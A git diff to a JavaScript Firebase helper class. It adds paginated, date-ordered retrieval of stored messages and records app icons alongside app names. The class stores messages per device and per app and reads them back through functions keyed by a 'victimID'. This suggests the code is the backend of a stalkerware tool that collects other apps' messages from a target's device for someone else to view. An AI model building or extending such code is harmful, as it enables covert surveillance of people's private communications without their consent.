@@ -32,25 +32,31 @@ export default class Firebase {
         });
     }
 
-    addMessageToCollection(msg,appName){
+    addMessageToCollection(msg,appName,appIcon = null){
         const userID = appSettings.getString("uniqueID");
         this.addToCollection(`messages/${userID ? userID : 'flotting' }/${appName}`,msg);
 
-        this.setApplicationNamesToCollection(`settings/`,userID ? userID : 'flotting',appName);
+        this.setApplicationNamesToCollection(`settings/`,userID ? userID : 'flotting',appName,appIcon);
     }
 
-    getMessagesFromCollection(victimID,appName){
-        return this.getAllDocuments(`messages/${victimID}/${appName}`);
+    getMessagesFromCollection(victimID,appName,lastDoc){
+        return this.getAllDocuments(`messages/${victimID}/${appName}`,lastDoc);
     }
 
     getApplicationNamesToCollection(victimID){
         return this.getOneDocument(`settings/`,victimID);
     }
 
-    getAllDocuments(collectionName){
+    getAllDocuments(collectionName,lastDoc = null){
         return new Promise((resolve,reject) => {
-            firebase.firestore
+            let query = firebase.firestore
             .collection(collectionName)
+            .orderBy("date","desc");
+            if(lastDoc){
+                query = query.startAfter(lastDoc);
+            }
+            
+            query.limit(10)
             .get()
             .then(querySnapshot => {
                 let snapshots = null;
@@ -58,6 +64,7 @@ export default class Firebase {
                     snapshots = querySnapshot.docs.map(doc => {
                         return {
                             id:doc.id,
+                            doc,
                             ...doc.data()
                         }
                     })
@@ -109,13 +116,14 @@ export default class Firebase {
     }
 
 
-    setApplicationNamesToCollection(collectionName,docId,appName){
+    setApplicationNamesToCollection(collectionName,docId,appName,appIcon){
         return new Promise((resolve,reject) => {
             firebase.firestore
             .collection(collectionName)
             .doc(docId)
             .update({
-                "application-names": firebase.firestore.FieldValue.arrayUnion(appName)
+                "application-names": firebase.firestore.FieldValue.arrayUnion(appName),
+                "application-icons": firebase.firestore.FieldValue.arrayUnion({appName,appIcon})
             })
             .then(() => {
                return true;
@@ -127,7 +135,8 @@ export default class Firebase {
                     .collection(collectionName)
                     .doc(docId)
                     .set({
-                        "application-names": [appName]
+                        "application-names": [appName],
+                        "application-icons": [{appName,appIcon}]
                     }).then(() => {
                         return resolve(true);
                     }).catch(err =>{
